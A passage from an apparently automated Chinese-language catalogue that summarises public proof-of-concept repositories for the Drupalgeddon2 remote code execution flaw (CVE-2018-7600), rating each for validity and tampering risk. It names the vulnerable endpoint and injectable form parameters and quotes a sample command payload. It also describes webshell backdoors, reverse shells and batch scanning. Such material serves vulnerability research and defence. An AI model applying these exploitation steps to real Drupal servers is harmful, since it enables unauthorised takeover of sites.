2.  根据Drupal版本选择合适的POC代码（Python或Ruby）。
3.  修改POC代码中的目标URL和要执行的命令。
4.  运行POC代码，发送恶意请求。
5.  验证代码是否成功执行（例如，检查目标服务器上是否创建了指定的文件）。

攻击者可利用该漏洞获取服务器的控制权，从而进行恶意活动，例如：数据窃取、恶意软件传播、DDoS攻击等。

**项目地址:** [happynote3966/CVE-2018-7600](https://github.com/happynote3966/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #13

**来源**: [CVE-2018-7600-killeveee_CVE-2018-7600.md](../2018/CVE-2018-7600-killeveee_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，并且可公开访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞，源于对用户提供的输入验证不足。 

**有效性：**
提供的PoC代码是有效的。PoC.py脚本用于验证目标Drupal站点是否存在漏洞，通过发送特制的请求在目标服务器上创建一个名为hh.txt的文件。Exp.py脚本则利用此漏洞在目标站点根目录下创建一个名为hh.php的后门文件，该后门允许通过GET或POST参数'c'执行任意系统命令。从提供的命令执行结果来看，PoC和Exp都成功执行，验证了漏洞的存在和利用。

**投毒风险：**
分析提供的PoC和Exp代码，没有发现明显的投毒代码。脚本的功能主要是利用漏洞进行验证和创建后门，没有发现恶意修改系统配置、窃取敏感信息或进行其他恶意行为的代码。README.md文件只是简单的漏洞描述和使用说明，没有包含任何可疑内容。因此，可以认为此仓库的投毒风险较低，为0%。

**利用方式：**
漏洞的利用方式是：

1.  **漏洞验证：** 使用PoC.py脚本验证目标Drupal站点是否存在CVE-2018-7600漏洞。
2.  **后门植入：** 如果PoC验证成功，使用Exp.py脚本在目标站点根目录下创建一个后门文件（hh.php）。后门文件包含PHP代码，允许通过GET/POST参数'c'执行任意系统命令。
3.  **远程控制：** 使用WebShell管理工具（如AntSword）连接到后门文件，通过'c'参数执行系统命令，实现对目标服务器的远程控制。

总的来说，该漏洞利用简单，危害巨大，攻击者可以利用该漏洞完全控制未打补丁的Drupal服务器。

**项目地址:** [killeveee/CVE-2018-7600](https://github.com/killeveee/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #14

**来源**: [CVE-2018-7600-knqyf263_CVE-2018-7600.md](../2018/CVE-2018-7600-knqyf263_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者在Drupal服务器上执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点需要运行在受影响的版本范围内，并且需要启用默认或常见的模块配置。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600 (Drupalgeddon2) 允许远程攻击者利用多个子系统中的缺陷执行任意代码。该漏洞的利用方式通常涉及构造恶意的HTTP请求，该请求包含精心设计的查询参数，这些参数利用了Drupal的输入验证漏洞，特别是与AJAX表单处理相关的漏洞。攻击者可以利用`element_parents`和`#lazy_builder`属性在服务器上执行PHP代码。提供的POC代码通过向`/user/register`端点发送POST请求，并在`mail`参数中注入恶意代码（`exec('echo vuln > hello.txt')`），尝试在目标服务器上创建一个名为`hello.txt`的文件，内容为`vuln`。如果成功创建该文件，则表明漏洞存在且可利用。

**有效性：**
从提供的漏洞信息、搜索结果和漏洞利用代码来看，此POC代码的有效性较高。多个来源表明该漏洞是真实存在的，并且存在公开可用的漏洞利用代码。搜索结果中也提到了针对此漏洞的Metasploit模块。

**投毒风险：**
该仓库中的投毒风险较低，大概在10%左右。Dockerfile文件只是简单的指定了Drupal镜像和维护者信息, README.md文件也只是简单的描述了漏洞和利用方式。exploit.py的代码功能相对简单，目的是验证漏洞的存在，风险较低。然而，仍然存在一定的风险，因为攻击者可能修改`exploit.py`以执行更危险的操作，例如下载并执行恶意软件，或者修改服务器配置。因此，在使用此POC代码时，务必对其进行仔细审查，并在隔离的环境中运行。

**利用方式：**
1.  攻击者构造一个包含恶意payload的HTTP POST请求，发送到Drupal站点的`/user/register`端点。
2.  Payload利用`element_parents`参数和`#lazy_builder`属性，在服务器端触发PHP代码执行。
3.  执行的PHP代码可以将任意命令注入到服务器的操作系统中。
4.  通过访问生成的`hello.txt`文件来验证漏洞是否成功利用。

**项目地址:** [knqyf263/CVE-2018-7600](https://github.com/knqyf263/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #15

**来源**: [CVE-2018-7600-madneal_codeql-scanner.md](../2018/CVE-2018-7600-madneal_codeql-scanner.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可网络访问，可能需要了解一些Drupal站点配置信息。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心中存在远程代码执行漏洞。攻击者可以通过发送特制的请求到未打补丁的Drupal站点来执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果（包括NVD、Rapid7、Tenable等）以及Exploit-DB中的expolit，此漏洞是真实存在的，并且有可用的POC。提供的README.md文件表明存在一个用于CVE-2018-7600的Python利用脚本（尽管这里没有提供脚本本身）。综合来看，利用是有效的。

**投毒风险：**
提供的POC代码只有README.md，内容非常简单，没有发现任何恶意代码或潜在的投毒行为。但是，由于缺失了核心的Python脚本，无法完全确定是否存在投毒风险。假定之后找到的利用脚本来源不可靠，存在修改或添加恶意代码的可能性，因此存在一定的投毒风险。这里给出一个较低的投毒风险概率，假设为5%。

**利用方式：**
漏洞的利用方式是向Drupal站点发送精心构造的恶意HTTP请求，利用Drupal的输入验证缺陷，在服务器端执行任意代码。根据搜索结果，该漏洞影响Drupal的多个子系统，可能利用了Drupal的渲染机制或其他处理输入的方式。攻击者通过构造包含恶意代码的请求参数，例如在URL或POST数据中，可以触发远程代码执行。具体细节取决于Drupal的版本和配置。Metasploit也提供了利用模块。

**总结：**
CVE-2018-7600是一个高危的Drupal远程代码执行漏洞，已经存在公开的POC。尽管提供的POC文件本身没有发现恶意代码，但获取利用脚本时需要注意来源，防范潜在的投毒风险。利用方式是通过构造恶意HTTP请求，利用Drupal的输入验证缺陷执行任意代码。

**项目地址:** [madneal/codeql-scanner](https://github.com/madneal/codeql-scanner)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #16

**来源**: [CVE-2018-7600-mr-won_CVE-2018-7600..md](../2018/CVE-2018-7600-mr-won_CVE-2018-7600..md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致网站完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且允许外部网络访问

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个影响Drupal 7.x和8.x的远程代码执行漏洞。攻击者可以通过构造特定的HTTP请求，利用Drupal的多个子系统中的缺陷，在目标服务器上执行任意代码。

**有效性：**
根据漏洞库信息、搜索结果和提供的PoC代码，该漏洞的利用是有效的。搜索结果中多个链接表明该漏洞已被广泛利用，并且存在公开的Exploit。

**投毒风险：**
提供的PoC代码相对简单，主要功能是发送一个包含恶意payload的POST请求到`/user/register`，并在目标服务器上创建一个名为`r3dxploit.txt`的文件，内容为“vulnerable to cve-7600-2018 exploit”。代码本身没有明显的恶意行为，如删除文件、上传恶意文件或执行其他危险操作。但是，在实际使用中，攻击者可以将payload修改为更具破坏性的命令，例如下载和执行恶意脚本。此外，代码作者信息中包含了一些可能与恶意活动相关的标识，例如使用“R3DXPLOIT”作为用户名和涉及Root权限的字眼。综合考虑，PoC代码本身存在一定潜在风险，但主要取决于使用者如何修改payload，因此投毒风险初步评估为10%。

**利用方式：**
1.  攻击者构造一个包含恶意payload的POST请求，该payload利用`user_register_form`的ajax功能注入恶意代码。
2.  请求发送到`/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`端点。
3.  Drupal处理请求时，由于输入验证不足，导致恶意代码被执行。
4.  PoC代码中，恶意代码的功能是在目标服务器上创建一个文件，表明漏洞存在。
5.  攻击者可以修改payload执行任意命令，例如反弹shell，从而完全控制目标服务器。

**项目地址:** [mr-won/CVE-2018-7600.](https://github.com/mr-won/CVE-2018-7600.)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #17

**来源**: [CVE-2018-7600-muhammedkayag_CVE-2018-7600.md](../2018/CVE-2018-7600-muhammedkayag_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站启用user register功能，且未及时更新补丁

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心中的未经身份验证的远程代码执行漏洞。攻击者可以通过构造特定的请求，利用Drupal的表单渲染机制，在服务器上执行任意代码。

**有效性：**
根据漏洞库信息和搜索引擎结果，该漏洞影响多个Drupal版本，且存在公开的漏洞利用代码。提供的POC代码利用了Drupal的`/user/register`接口，通过`element_parents`和`ajax_form`参数，以及`mail[#post_render][]`等构造恶意的payload，从而实现远程代码执行。该POC代码的有效性较高，因为很多文章和EXP都在使用此种方法。

**投毒风险：**
查看POC代码，发现其功能是发送恶意请求以利用漏洞并在目标机器上建立反向shell。在提供的代码里，存在一个比较明显的风险是，如果攻击者修改了 `command` 变量，有可能植入恶意后门，该变量定义了反向shell连接的目标 IP 地址和端口。 还有就是代码中包含的利用成功后的提示信息，如果被篡改，可能导致用户误判，这些地方存在一定的投毒风险。综合来看，代码的投毒风险为10%，主要是因为利用代码本身功能比较直接，修改后容易被发现。

**利用方式：**
1.  **目标确定：** 确定目标Drupal网站，且版本在受影响范围内（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  **监听端口：** 使用`listener()`函数在攻击机上监听指定端口（默认为1337），等待反向shell连接。
3.  **构造Payload：**  构造恶意的POST请求，利用`user/register`接口，并设置`element_parents`、`ajax_form`、`mail[#post_render][]`等参数，将要执行的命令嵌入到`mail[#markup]`中。
4.  **发送请求：** 使用`requests.post()`函数将构造好的Payload发送到目标Drupal网站。
5.  **建立连接：**  如果目标网站存在漏洞且利用成功，目标机器会执行Payload中的命令，即建立与攻击机指定端口的反向shell连接。
6.  **交互式Shell：**  连接建立后，`listener()`函数会将终端设置为raw模式，实现与目标机器的交互式shell会话。

**项目地址:** [muhammedkayag/CVE-2018-7600](https://github.com/muhammedkayag/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #18

**来源**: [CVE-2018-7600-nika0x38_CVE-2018-7600.md](../2018/CVE-2018-7600-nika0x38_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点存在漏洞且可网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon 2）是一个存在于Drupal多个子系统中的远程代码执行漏洞，影响多个使用了默认或常见模块配置的Drupal版本。攻击者可以通过构造特制的请求来利用此漏洞，从而在目标服务器上执行任意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，此漏洞是真实存在的，并且有公开可用的PoC代码。搜索结果表明，该漏洞被广泛利用，并对大量Drupal网站造成了影响。因此，提供的漏洞利用代码大概率有效，可以用于远程代码执行。

**投毒风险：**
提供的代码片段是`Cargo.lock`文件，该文件是Rust项目的依赖锁定文件，用于记录项目中使用的所有依赖项及其版本。该文件本身不包含任何可执行代码，因此不存在投毒风险。

**利用方式：**
利用方式通常涉及发送特制的HTTP请求，其中包含恶意代码，该代码将被Drupal服务器执行。具体利用方式取决于Drupal的配置，常见的利用方式是利用Drupal的renderable arrays特性，在请求参数中构造恶意的renderable arrays，触发PHP代码执行。攻击者通常会利用此漏洞执行系统命令，例如下载并执行恶意脚本，或者在服务器上安装后门。

**项目地址:** [nika0x38/CVE-2018-7600](https://github.com/nika0x38/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #19

**来源**: [CVE-2018-7600-r0lh_CVE-2018-7600.md](../2018/CVE-2018-7600-r0lh_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** Drupal网站存在漏洞且允许未授权用户访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意请求，利用Drupal的多个子系统（默认或常见模块配置）中的缺陷，在服务器上执行任意代码。 

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞是真实存在的，并且影响了多个Drupal版本。漏洞利用代码（PoC）的存在进一步证实了漏洞的可利用性。PoC代码的分析表明，它通过构造一个特殊的请求到`/user/register`路径，利用`element_parents`参数中的注入点执行命令。该PoC代码使用`drupal_ajax`的`_wrapper_format`，允许绕过一些安全检查。PoC首先设置目标URL，然后进入一个循环，该循环允许用户输入命令。命令通过`bash -c`执行，并将输出写入`poutput.txt`文件，然后读取此文件以显示命令的执行结果。

**投毒风险分析：**

分析提供的Go代码和相关文件，没有发现明显的投毒代码。该代码的主要功能是利用CVE-2018-7600漏洞在目标Drupal服务器上执行命令。代码使用`net/http`库发送HTTP请求，并使用`golang.org/x/net/proxy`库支持SOCKS5代理。代码从标准输入读取命令，并通过POST请求将其发送到目标服务器。然后，代码从服务器读取命令的输出并将其打印到标准输出。虽然该代码本身不包含恶意行为，但漏洞利用本身可能被滥用。

**利用方式总结：**

1.  **漏洞入口点：** `/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax`
2.  **攻击方式：** 通过POST请求，利用`mail[#post_render][]`、`mail[#type]`和`mail[#markup]`参数注入恶意代码。
3.  **命令执行：**  `mail[#markup]`参数中包含要执行的bash命令，利用`bash -c`执行。
4.  **结果获取：** 命令执行结果被写入`poutput.txt`文件，然后通过GET请求获取。
5.  **利用流程：**
    *   构造包含恶意代码的POST请求发送到漏洞入口点。
    *   Drupal解析请求并执行`mail[#markup]`参数中的命令。
    *   执行结果写入`poutput.txt`文件。
    *   攻击者通过GET请求读取`poutput.txt`文件获取命令执行结果。

**缓解措施：**

*   尽快将Drupal升级到不受影响的版本（7.58及以上，8.3.9及以上，8.4.6及以上，或8.5.1及以上）。
*   应用官方提供的补丁。
*   实施Web应用防火墙（WAF）规则来检测和阻止利用此漏洞的攻击。

**项目地址:** [r0lh/CVE-2018-7600](https://github.com/r0lh/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #20

**来源**: [CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md](../2018/CVE-2018-7600-r3dxpl0it_CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要目标Drupal站点未打补丁且可以通过网络访问

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。根据漏洞库信息和搜索结果，该漏洞影响多个Drupal版本，允许未经身份验证的远程攻击者执行任意代码。漏洞产生的原因是由于Drupal在处理用户输入时，对某些请求参数过滤不严，导致可以注入恶意代码。

**有效性：**
根据提供的漏洞信息和搜索结果，存在多个公开可用的漏洞利用代码（Exploit-DB等），并且有报告表明该漏洞已被广泛利用，因此该漏洞的POC是有效的。

**投毒风险：**
提供的漏洞利用代码只有GNU GENERAL PUBLIC LICENSE，是一个开源协议，不存在后门或者恶意代码,投毒风险为0。

**利用方式：**
利用方式主要通过构造恶意的HTTP请求，向Drupal服务器发送包含恶意代码的参数。恶意代码通常通过`#`和`[]`进行注入，利用Drupal的渲染机制执行PHP代码。攻击者可以执行任意系统命令，控制服务器。

根据搜索结果，攻击者通常利用以下方式：
1.  发送包含恶意payload的POST请求到Drupal站点。
2.  利用Drupal的渲染机制执行payload中的PHP代码。
3.  在服务器上执行任意命令，例如安装后门、窃取数据等。

**项目地址:** [r3dxpl0it/CVE-2018-7600](https://github.com/r3dxpl0it/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #21

**来源**: [CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md](../2018/CVE-2018-7600-rabbitmask_CVE-2018-7600-Drupal7.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码。

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点存在漏洞且可公开访问

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600，也被称为Drupalgeddon2，是一个存在于Drupal核心中的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些请求时，未对用户输入进行充分验证，导致攻击者可以在未经身份验证的情况下，通过构造特制的请求来执行任意代码。

**有效性：**
根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断该漏洞是有效的，并且存在公开可用的POC。

**投毒风险：**
提供的POC代码主要包含两个Python脚本：

*   `CVE-2018-7600-Drupal7-EXP.py`: 该脚本接收目标URL、命令、执行函数、代理等参数，通过构造恶意请求，向目标Drupal站点发送包含命令的payload，从而执行任意代码。
*   `CVE-2018-7600-Drupal7.py`: 该脚本通过读取`target.txt`文件中的目标URL，批量执行`whoami`命令，并将结果保存到`result.txt`文件中。
*   `README.md`: 描述了脚本的使用方法。

仔细分析这些代码，未发现明显的恶意行为或后门。`CVE-2018-7600-Drupal7.py` 脚本批量扫描是封装了`whoami`的exp。

但是，仍然存在一定的投毒风险，主要体现在以下几个方面：

1.  **依赖风险：** 脚本可能依赖于特定的第三方库，如果这些库被恶意修改，可能会导致脚本执行恶意代码。
2.  **命令注入风险：**  虽然脚本主要执行的是 `whoami` 命令，但是攻击者可以修改脚本，执行其他更具危害性的命令，比如删除文件、修改配置等。EXP.py允许自定义执行命令，存在风险。在使用时需要注意目标和命令。

总体而言，该仓库中作者隐藏的投毒代码的风险较低，大约为5%。

**利用方式：**

1.  **目标探测：**  使用`CVE-2018-7600-Drupal7.py` 脚本,通过提供包含目标URL的 `target.txt` 文件，批量扫描存在漏洞的Drupal站点。
2.  **漏洞利用：**  使用`CVE-2018-7600-Drupal7-EXP.py` 脚本，指定目标URL和要执行的命令，通过构造恶意请求，在目标Drupal站点上执行任意代码。 EXP.py允许自定义执行函数passthru，同样存在风险。
3.  **结果验证：**  检查命令执行的结果，确认漏洞是否成功利用。

**总结：**
CVE-2018-7600是一个高危的远程代码执行漏洞，攻击者可以利用该漏洞在Drupal站点上执行任意代码。虽然提供的POC代码本身不存在明显的恶意行为，但是仍然存在一定的投毒风险。在使用这些代码时，需要谨慎评估风险，并采取相应的安全措施。

**项目地址:** [rabbitmask/CVE-2018-7600-Drupal7](https://github.com/rabbitmask/CVE-2018-7600-Drupal7)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #22

**来源**: [CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md](../2018/CVE-2018-7600-rafaelcaria_drupalgeddon2-CVE-2018-7600.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未经身份验证的远程攻击者执行任意代码

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点必须使用受影响的版本，且未打补丁。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。该漏洞源于Drupal的Forms API中存在属性注入缺陷，允许未经身份验证的攻击者通过构造特制的请求来执行任意代码。

**有效性：**
根据提供的漏洞信息、搜索结果和漏洞利用代码，此漏洞的POC代码是有效的。漏洞库信息明确指出存在远程代码执行，搜索结果中也确认了该漏洞的严重性和广泛利用。提供的Python脚本`drupalgeddon2.py`允许测试目标是否易受攻击，并执行任意命令。

**投毒风险：**
虽然提供的代码可以直接利用漏洞执行命令，但仍然存在一定的投毒风险，例如：
*   该仓库只包含简单的利用脚本和一个README,代码量少,检查难度低. 
*   代码中利用`requests`库发送HTTP请求，如果被篡改，可能会向恶意服务器发送敏感信息或执行其他恶意操作.因为代码量少,只有10%的风险。

**利用方式：**
该漏洞的利用方式如下：
1.  攻击者构造一个包含恶意参数的HTTP POST请求，发送到目标Drupal站点的`user/password`路径。
2.  恶意参数利用了Drupal Forms API中的`#post_render`属性，允许攻击者指定一个PHP函数（例如`passthru`）来执行命令。
3.  `name[#markup]`参数包含要执行的操作系统命令。
4.  目标Drupal站点处理请求时，会执行攻击者指定的命令。
5.  攻击者可以通过`?q=/file/ajax/name/%23value/` 获取命令执行的结果。

总之，CVE-2018-7600是一个严重的安全漏洞，允许远程攻击者执行任意代码。提供的POC代码是有效的，但使用者应谨慎使用，并注意潜在的投毒风险。

**项目地址:** [rafaelcaria/drupalgeddon2-CVE-2018-7600](https://github.com/rafaelcaria/drupalgeddon2-CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #23

**来源**: [CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md](../2018/CVE-2018-7600-rajaabdullahnasir_CVE-2018-7600-Remote-Code-Execution.md)

## CVE-2018-7600-Drupalgeddon2-远程代码执行

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可能导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 需要Drupal网站运行在受影响的版本，且允许未授权访问的URL。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2018-7600，又名Drupalgeddon2，是一个Drupal核心的远程代码执行漏洞。由于Drupal的Form API（FAPI）在处理AJAX请求时，未充分清理数组值，导致未经身份验证的攻击者可以通过构造恶意请求来执行任意代码。利用方式通常涉及发送包含恶意payload的POST请求到特定Drupal路径（例如/user/register?element_parents=account/mail/%23value&ajax_form=1&_wrapper_format=drupal_ajax）。

**有效性：**
根据漏洞库信息、搜索引擎结果（如NVD、Rapid7、Trend Micro等）以及提供的POC代码，此漏洞是真实存在的，并且存在公开可用的利用代码。POC代码提供单目标、多目标、自定义命令执行等功能，并具有彩色CLI输出和日志记录，增加了利用的便利性，因此该POC代码有效。

**投毒风险：**
分析提供的`drupalgeddon2.py`代码片段，未发现明显的恶意投毒代码。代码主要功能是发送HTTP请求，执行命令，并解析结果，都是漏洞利用的正常行为。虽然存在远程代码执行的风险，但这是漏洞本身的性质，而不是POC引入的额外风险。README中存在免责声明，强调该工具仅用于授权的渗透测试。投毒风险评估为10%，主要考虑到以下几点：
* 代码的复杂性可能隐藏不易察觉的后门。
* 作者有可能在后续版本中添加恶意代码。

**利用方式：**
1.  确定目标Drupal网站是否运行在受影响的版本（Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1）。
2.  使用提供的POC脚本，指定目标URL和要执行的命令。
3.  运行脚本，脚本会发送特制的HTTP POST请求到Drupal网站。
4.  如果漏洞存在，Drupal网站将执行指定的命令，并将结果返回给攻击者。
5.  攻击者可以利用此漏洞进一步控制服务器，例如安装恶意软件、窃取数据等。

**项目地址:** [rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution](https://github.com/rajaabdullahnasir/CVE-2018-7600-Remote-Code-Execution)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #24

**来源**: [CVE-2018-7600-raytran54_CVE-2018-7600.md](../2018/CVE-2018-7600-raytran54_CVE-2018-7600.md)

## CVE-2018-7600 Drupalgeddon2

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，允许未授权远程代码执行

**影响版本:** Drupal 7.x < 7.58, Drupal 8.x < 8.3.9, Drupal 8.4.x < 8.4.6, Drupal 8.5.x < 8.5.1

**利用条件:** 目标Drupal站点启用user_register_form或者其他存在可利用的Form API Ajax Request的模块

**POC 可用性:** 是

**投毒风险:** 1%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个存在于Drupal核心中的远程代码执行漏洞。攻击者可以通过构造恶意的请求，利用Drupal的Form API中的漏洞，在目标服务器上执行任意代码。

**有效性分析：**

根据提供的漏洞库信息、搜索结果以及漏洞利用代码，该漏洞的POC代码是有效的。搜索结果中包含了多个关于该漏洞的分析、利用以及修复建议，证明该漏洞在野外被广泛利用。

提供的Python POC利用了user_register_form，通过修改mail字段，构造恶意的payload，将命令注入到#post_render中，触发远程代码执行。代码首先构造包含恶意命令的POST请求，发送到/user/register，然后尝试读取/res.txt，如果成功读取，则表明目标存在漏洞，并输出命令执行结果。

**投毒风险分析：**

提供的POC代码本身较为简洁，主要功能是发送恶意请求并读取结果。README.md文件主要包含漏洞分析、原理说明和缓解措施。检查了Python脚本，发现它执行命令并将输出写入一个名为res.txt的文件，这本身不是投毒，而是漏洞利用的一部分。但理论上，如果攻击者替换了POC中执行的命令，可能会导致服务器执行恶意操作，例如下载恶意软件或修改系统配置。但基于目前提供的文件内容，投毒风险极低。

综合考虑，该仓库存在投毒代码的风险极低，约为1%。

**利用方式分析：**

1.  **漏洞触发点：** Drupal的Form API在处理Ajax请求时，没有充分验证用户输入，导致可以注入恶意代码。
2.  **利用途径：** 攻击者通过构造特殊的POST请求，修改`form_id`、`_drupal_ajax`，`mail[#post_render][]`等参数。
3.  **代码执行：** Drupal在处理请求时，会将`mail[#post_render][]`中的内容作为PHP函数执行，从而导致远程代码执行。
4.  **验证：** POC通过执行命令，并将结果写入res.txt文件，然后尝试读取该文件来验证漏洞是否存在。

**防范措施:**

*   及时升级Drupal版本到安全版本（7.58, 8.3.9, 8.4.6, 或 8.5.1之后）。
*   应用Drupal官方提供的补丁。
*   使用Web应用防火墙（WAF）过滤恶意请求。

**项目地址:** [raytran54/CVE-2018-7600](https://github.com/raytran54/CVE-2018-7600)

**漏洞详情:** [CVE-2018-7600](https://nvd.nist.gov/vuln/detail/CVE-2018-7600)

---

## POC #25

**来源**: [CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md](../2018/CVE-2018-7600-ruthvikvegunta_Drupalgeddon2.md)

## CVE-2018-7600-Drupal-RCE

**漏洞编号:** CVE-2018-7600

**漏洞类型:** 远程代码执行

**影响应用:** Drupal

**危害等级:** 高危，可导致服务器完全控制

**影响版本:** Drupal before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, and 8.5.x before 8.5.1

**利用条件:** 目标Drupal站点未打补丁，且使用默认或常见模块配置

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2018-7600（Drupalgeddon2）是一个Drupal核心的远程代码执行漏洞。漏洞原因是由于Drupal在处理某些用户输入时，未进行充分的验证和过滤，导致攻击者可以通过构造恶意的请求，将恶意代码注入到系统，从而实现远程代码执行。

**有效性：**

根据漏洞库信息、搜索引擎结果以及大量的公开利用代码来看，该漏洞的利用具有很高的有效性。 搜索结果中，许多文章都讨论了该漏洞的利用方法，Metasploit中也有相应的利用模块，Exploit-DB上也有相关的exploit。

